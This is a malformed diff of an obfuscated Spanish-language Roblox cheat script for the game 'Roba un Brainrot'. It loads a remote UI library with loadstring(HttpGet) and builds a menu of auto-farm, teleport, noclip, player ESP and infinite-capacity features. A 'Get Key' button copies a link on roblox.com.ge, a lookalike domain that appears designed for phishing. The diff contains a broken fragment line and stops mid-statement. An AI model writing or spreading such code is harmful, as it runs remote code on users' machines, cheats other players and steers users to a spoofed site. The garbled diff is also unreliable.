@@ -1,333 +1,79 @@
--- Obfuscated by X-Team Protection System
+Obfuscated by X-Team Protection System
 local _0x1a2b3c = loadstring(game:HttpGet('https://sirius.menu/rayfield', true))()
 local _0x4d5e6f, _0x7g8h9i, _0x1j2k3l = false, false, false
 local _0x4m5n6o = _0x1a2b3c:CreateWindow({Name = "\xF0\x9F\x94\x91 Key System - Roba un Brainrot", LoadingTitle = "Verificaci\xC3\xB3n", LoadingSubtitle = "by technoourielcompany", ConfigurationSaving = {Enabled = false}, Discord = {Enabled = false}, KeySystem = false})
 local _0x7p8q9r = _0x4m5n6o:CreateTab("Key", 4483362458)
 local _0x1s2t3u = _0x7p8q9r:CreateInput({Name = "Introduce tu Key", PlaceholderText = "Escribe tu clave aqu\xC3\xAD...", RemoveTextAfterFocusLost = false, Callback = function(_0xv1w2x3)
-    if string.lower(_0xv1w2x3) == "miclave123" then
-        _0x4d5e6f = true
-        _0x1a2b3c:Notify({Title = "\xE2\x9C\x85 Correcto", Content = "Clave verificada con \xC3\xA9xito", Duration = 3})
-        _0xy4z5a6()
-    else
-        _0x1a2b3c:Notify({Title = "\xE2\x9D\x8C Error", Content = "Clave incorrecta", Duration = 3})
-    end
+    if string.lower(_0xv1w2x3) == "miclave123" then
+        _0x4d5e6f = true
+        _0x1a2b3c:Notify({Title = "\xE2\x9C\x85 Correcto", Content = "Clave verificada con \xC3\xA9xito", Duration = 3})
+        _0xy4z5a6()
+    else
+        _0x1a2b3c:Notify({Title = "\xE2\x9D\x8C Error", Content = "Clave incorrecta", Duration = 3})
+    end
 end})
-
-    local _0xe1f2g3 = "https://roblox.com.ge/communities/2689693106/"
- de la Key al portapapeles", Duration = 3})
+local _0x7b8c9d = _0x7p8q9r:CreateButton({Name = "\xF0\x9F\x93\x8B Get Key", Callback = function()
+    local _0xe1f2g3 = "https://roblox.com.ge/communities/2689693106/"
+    setclipboard(_0xe1f2g3)
+    _0x1a2b3c:Notify({Title = "\xF0\x9F\x93\x8B Copiado", Content = "Se copi\xC3\xB3 el link de la Key al portapapeles", Duration = 3})
 end})
 function _0xy4z5a6()
-    local _0xh4i5j6 = _0x4m5n6o:CreateTab("\xF0\x9F\xA7\xA0 Auto Farm", 4483362458)
-    _0xh4i5j6:CreateSection("Farmeo Autom\xC3\xA1tico")
-    local _0xk7l8m9 = _0xh4i5j6:CreateToggle({Name = "Auto Recoger Brainrots", CurrentValue = false, Flag = "AutoCollect", Callback = function(_0xn1o2p3)
-        _0x1j2k3l = _0xn1o2p3
-        if _0xn1o2p3 then
-            _0x1a2b3c:Notify({Title = "\xF0\x9F\xA7\xA0 Activado", Content = "Recolectando Brainrots autom\xC3\xA1ticamente...", Duration = 2})
-            _0xq4r5s6()
-        else
-            _0x1a2b3c:Notify({Title = "\xE2\x8F\xB8\xEF\xB8\x8F Pausado", Content = "Auto recolecci\xC3\xB3n detenida", Duration = 2})
-        end
-    end})
-    local _0xt7u8v9 = _0xh4i5j6:CreateToggle({Name = "Auto Farm (TP a Brainrots)", CurrentValue = false, Flag = "AutoFarm", Callback = function(_0xw1x2y3)
-        _0x7g8h9i = _0xw1x2y3
-        if _0xw1x2y3 then
-            _0x1a2b3c:Notify({Title = "\xE2\x9A\xA1 Activado", Content = "Teletransport\xC3\xA1ndose a Brainrots...", Duration = 2})
-            _0xz4a5b6()
-        else
-            _0x1a2b3c:Notify({Title = "\xE2\x8F\xB8\xEF\xB8\x8F Pausado", Content = "Auto Farm detenido", Duration = 2})
-        end
-    end})
-    local _0xc7d8e9 = 0.5
-    local _0xf1g2h3 = _0xh4i5j6:CreateSlider({Name = "Velocidad de Farm", Range = {0.1, 2}, Increment = 0.1, CurrentValue = 0.5, Flag = "FarmSpeed", Callback = function(_0xi4j5k6)
-        _0xc7d8e9 = _0xi4j5k6
-    end})
-    _0xh4i5j6:CreateSection("Spawn de Brainrots")
-    local _0xl7m8n9 = _0xh4i5j6:CreateButton({Name = "\xF0\x9F\x8E\xAF TP al Spawn de Brainrots", Callback = function()
-        _0xo1p2q3()
-    end})
-    local _0xr4s5t6 = _0xh4i5j6:CreateToggle({Name = "Notificar Brainrots Cercanos", CurrentValue = true, Flag = "Notify", Callback = function(_0xu7v8w9) end})
-    local _0xx1y2z3 = _0x4m5n6o:CreateTab("\xF0\x9F\x8C\x8D Teleports", 4483362458)
-    _0xx1y2z3:CreateSection("Lugares Importantes")
-    local _0xa4b5c6 = _0xx1y2z3:CreateButton({Name = "\xF0\x9F\x8F\xAA TP a Tienda", Callback = function()
-        _0xd7e8f9()
-    end})
-    local _0xg1h2i3 = _0xx1y2z3:CreateButton({Name = "\xF0\x9F\x92\xB0 TP a Zona de Venta", Callback = function()
-        _0xj4k5l6()
-    end})
-    local _0xm7n8o9 = _0xx1y2z3:CreateButton({Name = "\xF0\x9F\xA7\xB2 Traer Todos los Brainrots", Callback = function()
-        _0xp1q2r3()
-    end})
-    _0xx1y2z3:CreateSection("Jugadores")
-    local _0xs4t5u6 = {}
-    for _, _0xv7w8x9 in pairs(game.Players:GetPlayers()) do
-        if _0xv7w8x9 ~= game.Players.LocalPlayer then
-            table.insert(_0xs4t5u6, _0xv7w8x9.Name)
-        end
-    end
-    local _0xy1z2a3 = ""
-    local _0xb4c5d6 = _0xx1y2z3:CreateDropdown({Name = "Seleccionar Jugador", Options = _0xs4t5u6, CurrentOption = _0xs4t5u6[1] or "Ninguno", Flag = "PlayerTP", Callback = function(_0xe7f8g9)
-        _0xy1z2a3 = _0xe7f8g9
-    end})
-    local _0xh1i2j3 = _0xx1y2z3:CreateButton({Name = "\xE2\x9E\xA1\xEF\xB8\x8F Teleportarse al Jugador", Callback = function()
-        if _0xy1z2a3 ~= "" then
-            _0xk4l5m6(_0xy1z2a3)
-        end
-    end})
-    local _0xn7o8p9 = _0x4m5n6o:CreateTab("\xE2\x9A\xA1 Exploits", 4483362458)
-    _0xn7o8p9:CreateSection("Movimiento")
-    local _0xq1r2s3 = _0xn7o8p9:CreateSlider({Name = "Velocidad de Movimiento", Range = {16, 200}, Increment = 1, CurrentValue = 16, Flag = "WalkSpeed", Callback = function(_0xt4u5v6)
-        local _0xw7x8y9 = game.Players.LocalPlayer
-        if _0xw7x8y9.Character and _0xw7x8y9.Character:FindFirstChild("Humanoid") then
-            _0xw7x8y9.Character.Humanoid.WalkSpeed = _0xt4u5v6
-        end
-    end})
-    local _0xz1a2b3 = _0xn7o8p9:CreateSlider({Name = "Poder de Salto", Range = {50, 300}, Increment = 1, CurrentValue = 50, Flag = "JumpPower", Callback = function(_0xc4d5e6)
-        local _0xf7g8h9 = game.Players.LocalPlayer
-        if _0xf7g8h9.Character and _0xf7g8h9.Character:FindFirstChild("Humanoid") then
-            _0xf7g8h9.Character.Humanoid.JumpPower = _0xc4d5e6
-        end
-    end})
-    local _0xi1j2k3 = false
-    local _0xl4m5n6 = _0xn7o8p9:CreateToggle({Name = "Noclip (Atravesar Paredes)", CurrentValue = false, Flag = "Noclip", Callback = function(_0xo7p8q9)
-        _0xi1j2k3 = _0xo7p8q9
-        if _0xo7p8q9 then
-            _0xr1s2t3()
-        end
-    end})
-    _0xn7o8p9:CreateSection("Capacidad")
-    local _0xu4v5w6 = _0xn7o8p9:CreateToggle({Name = "Capacidad Infinita", CurrentValue = false, Flag = "InfiniteCapacity", Callback = function(_0xx7y8z9)
-        if _0xx7y8z9 then
-            _0xa1b2c3()
-        end
-    end})
-    local _0xd4e5f6 = _0x4m5n6o:CreateTab("\xF0\x9F\x91\x81\xEF\xB8\x8F Visual", 4483362458)
-    _0xd4e5f6:CreateSection("ESP y Visibilidad")
-    local _0xg7h8i9 = _0xd4e5f6:CreateToggle({Name = "ESP Brainrots", CurrentValue = false, Flag = "BrainrotESP", Callback = function(_0xj1k2l3)
-        if _0xj1k2l3 then
-            _0xm4n5o6()
-        else
-            _0xp7q8r9()
-        end
-    end})
-    local _0xs1t2u3 = _0xd4e5f6:CreateToggle({Name = "ESP Jugadores", CurrentValue = false, Flag = "PlayerESP", Callback = function(_0xv4w5x6)
-        if _0xv4w5x6 then
-            _0xy7z8a9()
-        else
-            _0xb1c2d3()
-        end
-    end})
-    local _0xe4f5g6 = _0xd4e5f6:CreateButton({Name = "\xF0\x9F\x92\xA1 Fullbright", Callback = function()
-        _0xh7i8j9()
-    end})
-    local _0xk1l2m3 = _0x4m5n6o:CreateTab("\xF0\x9F\x94\xA7 Misc", 4483362458)
-    _0xk1l2m3:CreateSection("Utilidades")
-    local _0xn4o5p6 = _0xk1l2m3:CreateToggle({Name = "Auto Vender Brainrots", CurrentValue = false, Flag = "AutoSell", Callback = function(_0xq7r8s9)
-        if _0xq7r8s9 then
-            _0xt1u2v3()
-        end
-    end})
-    local _0xw4x5y6 = _0xk1l2m3:CreateToggle({Name = "Salto Infinito", CurrentValue = false, Flag = "InfiniteJump", Callback = function(_0xz7a8b9)
-        if _0xz7a8b9 then
-            _0xc1d2e3()
-        end
-    end})
-    local _0xf4g5h6 = _0xk1l2m3:CreateButton({Name = "\xF0\x9F\x94\x84 Rejoin Servidor", Callback = function()
-        game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
-    end})
-end
-function _0xq4r5s6()
-    spawn(function()
-        while _0x1j2k3l do
-            for _, _0xi7j8k9 in pairs(workspace:GetDescendants()) do
-                if _0xi7j8k9:IsA("Model") and (_0xi7j8k9.Name:lower():find("brainrot") or _0xi7j8k9.Name:lower():find("rot")) then
-                    if _0xi7j8k9:FindFirstChild("Handle") or _0xi7j8k9:FindFirstChild("HumanoidRootPart") then
-                        local _0xl1m2n3 = game.Players.LocalPlayer
-                        if _0xl1m2n3.Character and _0xl1m2n3.Character:FindFirstChild("HumanoidRootPart") then
-                            local _0xo4p5q6 = _0xl1m2n3.Character.HumanoidRootPart
-                            local _0xr7s8t9 = _0xi7j8k9:FindFirstChild("Handle") or _0xi7j8k9:FindFirstChild("HumanoidRootPart")
-                            if _0xr7s8t9 then
-                                firetouchinterest(_0xo4p5q6, _0xr7s8t9, 0)
-                                wait(0.1)
-                                firetouchinterest(_0xo4p5q6, _0xr7s8t9, 1)
-                            end
-                        end
-                    end
-                end
-            end
-            wait(_0xc7d8e9 or 0.5)
-        end
-    end)
-end
-function _0xz4a5b6()
-    spawn(function()
-        while _0x7g8h9i do
-            for _, _0xu1v2w3 in pairs(workspace:GetDescendants()) do
-                if _0x7g8h9i == false then break end
-                if _0xu1v2w3:IsA("Model") and (_0xu1v2w3.Name:lower():find("brainrot") or _0xu1v2w3.Name:lower():find("rot")) then
-                    local _0xx4y5z6 = _0xu1v2w3:FindFirstChild("Handle") or _0xu1v2w3:FindFirstChild("HumanoidRootPart")
-                    if _0xx4y5z6 then
-                        local _0xa7b8c9 = game.Players.LocalPlayer
-                        if _0xa7b8c9.Character and _0xa7b8c9.Character:FindFirstChild("HumanoidRootPart") then
-                            _0xa7b8c9.Character.HumanoidRootPart.CFrame = _0xx4y5z6.CFrame
-                            wait(0.2)
-                        end
-                    end
-                end
-            end
-            wait(_0xc7d8e9 or 0.5)
-        end
-    end)
-end
-function _0xp1q2r3()
-    local _0xd1e2f3 = game.Players.LocalPlayer
-    if not _0xd1e2f3.Character or not _0xd1e2f3.Character:FindFirstChild("HumanoidRootPart") then return end
-    local _0xg4h5i6 = 0
-    for _, _0xj7k8l9 in pairs(workspace:GetDescendants()) do
-        if _0xj7k8l9:IsA("Model") and (_0xj7k8l9.Name:lower():find("brainrot") or _0xj7k8l9.Name:lower():find("rot")) then
-            local _0xm1n2o3 = _0xj7k8l9:FindFirstChild("Handle") or _0xj7k8l9:FindFirstChild("HumanoidRootPart")
-            if _0xm1n2o3 then
-                _0xm1n2o3.CFrame = _0xd1e2f3.Character.HumanoidRootPart.CFrame
-                _0xg4h5i6 = _0xg4h5i6 + 1
-            end
-        end
-    end
-    _0x1a2b3c:Notify({Title = "\xF0\x9F\xA7\xB2 Completado", Content = "Se trajeron ".._0xg4h5i6.." brainrots", Duration = 3})
-end
-function _0xo1p2q3()
-    local _0xp4q5r6 = game.Players.LocalPlayer
-    if _0xp4q5r6.Character and _0xp4q5r6.Character:FindFirstChild("HumanoidRootPart") then
-        local _0xs7t8u9 = workspace:FindFirstChild("SpawnLocation") or workspace:FindFirstChild("Spawn")
-        if _0xs7t8u9 then
-            _0xp4q5r6.Character.HumanoidRootPart.CFrame = _0xs7t8u9.CFrame + Vector3.new(0, 5, 0)
-        end
-    end
-end
-function _0xd7e8f9()
-    local _0xv1w2x3 = game.Players.LocalPlayer
-    if _0xv1w2x3.Character and _0xv1w2x3.Character:FindFirstChild("HumanoidRootPart") then
-        local _0xy4z5a6 = workspace:FindFirstChild("Shop") or workspace:FindFirstChild("Store")
-        if _0xy4z5a6 and _0xy4z5a6:FindFirstChild("Door") then
-            _0xv1w2x3.Character.HumanoidRootPart.CFrame = _0xy4z5a6.Door.CFrame + Vector3.new(0, 5, 0)
-        end
-    end
-end
-function _0xj4k5l6()
-    local _0xb7c8d9 = game.Players.LocalPlayer
-    if _0xb7c8d9.Character and _0xb7c8d9.Character:FindFirstChild("HumanoidRootPart") then
-        local _0xe1f2g3 = workspace:FindFirstChild("SellZone") or workspace:FindFirstChild("Sell")
-        if _0xe1f2g3 then
-            _0xb7c8d9.Character.HumanoidRootPart.CFrame = _0xe1f2g3.CFrame + Vector3.new(0, 5, 0)
-        end
-    end
-end
-function _0xk4l5m6(_0xh4i5j6)
-    local _0xk7l8m9 = game.Players:FindFirstChild(_0xh4i5j6)
-    if _0xk7l8m9 and _0xk7l8m9.Character and _0xk7l8m9.Character:FindFirstChild("HumanoidRootPart") then
-        local _0xn1o2p3 = game.Players.LocalPlayer
-        if _0xn1o2p3.Character and _0xn1o2p3.Character:FindFirstChild("HumanoidRootPart") then
-            _0xn1o2p3.Character.HumanoidRootPart.CFrame = _0xk7l8m9.Character.HumanoidRootPart.CFrame
-        end
-    end
-end
-function _0xr1s2t3()
-    spawn(function()
-        while _0xi1j2k3 do
-            local _0xq4r5s6 = game.Players.LocalPlayer
-            if _0xq4r5s6.Character then
-                for _, _0xt7u8v9 in pairs(_0xq4r5s6.Character:GetDescendants()) do
-                    if _0xt7u8v9:IsA("BasePart") then
-                        _0xt7u8v9.CanCollide = false
-                    end
-                end
-            end
-            wait()
-        end
-        if _0xq4r5s6.Character then
-            for _, _0xw1x2y3 in pairs(_0xq4r5s6.Character:GetDescendants()) do
-                if _0xw1x2y3:IsA("BasePart") then
-                    _0xw1x2y3.CanCollide = true
-                end
-            end
-        end
-    end)
-end
-function _0xa1b2c3()
-    spawn(function()
-        while task.wait(1) do
-            local _0xz4a5b6 = game.Players.LocalPlayer
-            if _0xz4a5b6:FindFirstChild("leaderstats") then
-                for _, _0xc7d8e9 in pairs(_0xz4a5b6.leaderstats:GetChildren()) do
-                    if _0xc7d8e9.Name:lower():find("capacity") or _0xc7d8e9.Name:lower():find("capacidad") then
-                        _0xc7d8e9.Value = math.huge
-                    end
-                end
-            end
-        end
-    end)
-end
-function _0xm4n5o6()
-    for _, _0xf1g2h3 in pairs(workspace:GetDescendants()) do
-        if _0xf1g2h3:IsA("Model") and (_0xf1g2h3.Name:lower():find("brainrot") or _0xf1g2h3.Name:lower():find("rot")) then
-            local _0xi4j5k6 = Instance.new("Highlight")
-            _0xi4j5k6.Name = "BrainrotESP"
-            _0xi4j5k6.Parent = _0xf1g2h3
-            _0xi4j5k6.FillColor = Color3.new(0, 1, 0)
-            _0xi4j5k6.OutlineColor = Color3.new(1, 1, 1)
-            _0xi4j5k6.FillTransparency = 0.5
-        end
-    end
-end
-function _0xp7q8r9()
-    for _, _0xl7m8n9 in pairs(workspace:GetDescendants()) do
-        if _0xl7m8n9:IsA("Highlight") and _0xl7m8n9.Name == "BrainrotESP" then
-            _0xl7m8n9:Destroy()
-        end
-    end
-end
-function _0xy7z8a9()
-    for _, _0xo1p2q3 in pairs(game.Players:GetPlayers()) do
-        if _0xo1p2q3 ~= game.Players.LocalPlayer and _0xo1p2q3.Character then
-            local _0xr4s5t6 = Instance.new("Highlight")
-            _0xr4s5t6.Name = "PlayerESP"
-            _0xr4s5t6.Parent = _0xo1p2q3.Character
-            _0xr4s5t6.FillColor = Color3.new(1, 0, 0)
-            _0xr4s5t6.OutlineColor = Color3.new(1, 1, 1)
-            _0xr4s5t6.FillTransparency = 0.5
-        end
-    end
-end
-function _0xb1c2d3()
-    for _, _0xu7v8w9 in pairs(game.Players:GetPlayers()) do
-        if _0xu7v8w9.Character then
-            local _0xx1y2z3 = _0xu7v8w9.Character:FindFirstChild("PlayerESP")
-            if _0xx1y2z3 then
-                _0xx1y2z3:Destroy()
-            end
-        end
-    end
-end
-function _0xh7i8j9()
-    local _0xa4b5c6 = game:GetService("Lighting")
-    _0xa4b5c6.Brightness = 2
-    _0xa4b5c6.ClockTime = 14
-    _0xa4b5c6.FogEnd = 100000
-    _0xa4b5c6.GlobalShadows = false
-    _0xa4b5c6.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
-    _0x1a2b3c:Notify({Title = "\xF0\x9F\x92\xA1 Fullbright", Content = "Iluminaci\xC3\xB3n m\xC3\xA1xima activada", Duration = 2})
-end
-function _0xc1d2e3()
-    game:GetService("UserInputService").JumpRequest:Connect(function()
-        local _0xd7e8f9 = game.Players.LocalPlayer
-        if _0xd7e8f9.Character and _0xd7e8f9.Character:FindFirstChild("Humanoid") then
-            _0xd7e8f9.Character.Humanoid:ChangeState("Jumping")
-        end
-    end)
-end
-function _0xt1u2v3()
-    spawn(function()
-        while task.wait(5) do
-            _0xj4k5l6()
-            wait(1)
-        end
-    end)
-end
+    local _0xh4i5j6 = _0x4m5n6o:CreateTab("\xF0\x9F\xA7\xA0 Auto Farm", 4483362458)
+    _0xh4i5j6:CreateSection("Farmeo Autom\xC3\xA1tico")
+    local _0xk7l8m9 = _0xh4i5j6:CreateToggle({Name = "Auto Recoger Brainrots", CurrentValue = false, Flag = "AutoCollect", Callback = function(_0xn1o2p3)
+        _0x1j2k3l = _0xn1o2p3
+        if _0xn1o2p3 then
+            _0x1a2b3c:Notify({Title = "\xF0\x9F\xA7\xA0 Activado", Content = "Recolectando Brainrots autom\xC3\xA1ticamente...", Duration = 2})
+            _0xq4r5s6()
+        else
+            _0x1a2b3c:Notify({Title = "\xE2\x8F\xB8\xEF\xB8\x8F Pausado", Content = "Auto recolecci\xC3\xB3n detenida", Duration = 2})
+        end
+    end})
+    local _0xt7u8v9 = _0xh4i5j6:CreateToggle({Name = "Auto Farm (TP a Brainrots)", CurrentValue = false, Flag = "AutoFarm", Callback = function(_0xw1x2y3)
+        _0x7g8h9i = _0xw1x2y3
+        if _0xw1x2y3 then
+            _0x1a2b3c:Notify({Title = "\xE2\x9A\xA1 Activado", Content = "Teletransport\xC3\xA1ndose a Brainrots...", Duration = 2})
+            _0xz4a5b6()
+        else
+            _0x1a2b3c:Notify({Title = "\xE2\x8F\xB8\xEF\xB8\x8F Pausado", Content = "Auto Farm detenido", Duration = 2})
+        end
+    end})
+    local _0xc7d8e9 = 0.5
+    local _0xf1g2h3 = _0xh4i5j6:CreateSlider({Name = "Velocidad de Farm", Range = {0.1, 2}, Increment = 0.1, CurrentValue = 0.5, Flag = "FarmSpeed", Callback = function(_0xi4j5k6)
+        _0xc7d8e9 = _0xi4j5k6
+    end})
+    _0xh4i5j6:CreateSection("Spawn de Brainrots")
+    local _0xl7m8n9 = _0xh4i5j6:CreateButton({Name = "\xF0\x9F\x8E\xAF TP al Spawn de Brainrots", Callback = function()
+        _0xo1p2q3()
+    end})
+    local _0xr4s5t6 = _0xh4i5j6:CreateToggle({Name = "Notificar Brainrots Cercanos", CurrentValue = true, Flag = "Notify", Callback = function(_0xu7v8w9) end})
+    local _0xx1y2z3 = _0x4m5n6o:CreateTab("\xF0\x9F\x8C\x8D Teleports", 4483362458)
+    _0xx1y2z3:CreateSection("Lugares Importantes")
+    local _0xa4b5c6 = _0xx1y2z3:CreateButton({Name = "\xF0\x9F\x8F\xAA TP a Tienda", Callback = function()
+        _0xd7e8f9()
+    end})
+    local _0xg1h2i3 = _0xx1y2z3:CreateButton({Name = "\xF0\x9F\x92\xB0 TP a Zona de Venta", Callback = function()
+        _0xj4k5l6()
+    end})
+    local _0xm7n8o9 = _0xx1y2z3:CreateButton({Name = "\xF0\x9F\xA7\xB2 Traer Todos los Brainrots", Callback = function()
+        _0xp1q2r3()
+    end})
+    _0xx1y2z3:CreateSection("Jugadores")
+    local _0xs4t5u6 = {}
+    for _, _0xv7w8x9 in pairs(game.Players:GetPlayers()) do
+        if _0xv7w8x9 ~= game.Players.LocalPlayer then
+            table.insert(_0xs4t5u6, _0xv7w8x9.Name)
+        end
+    end
+    local _0xy1z2a3 = ""
+    local _0xb4c5d6 = _0xx1y2z3:CreateDropdown({Name = "Seleccionar Jugador", Options = _0xs4t5u6, CurrentOption = _0xs4t5u6[1] or "Ninguno", Flag = "PlayerTP", Callback = function(_0xe7f8g9)
+        _0xy1z2a3 = _0xe7f8g9
+    end})
+    local _0xh1i2j3 = _0xx1y2z3:CreateButton({Name = "\xE2\x9E\xA1\xEF\xB8\x8F Teleportarse al Jugador", Callback = function()
+        if _0xy1z2a3 ~= "" then
+            _0xk4l5m6(_0xy1z2a3)
+        end
+    end})
+    local _0xn7o8p9 = _0x4m5n6o:CreateTab("\xE2\x9A\xA1 Exploits", 4483362458)
+    _0xn7o8p9:CreateSection("Movimiento")
+    local _0xq1r2s3 = _0xn7o8p9:CreateSlider({
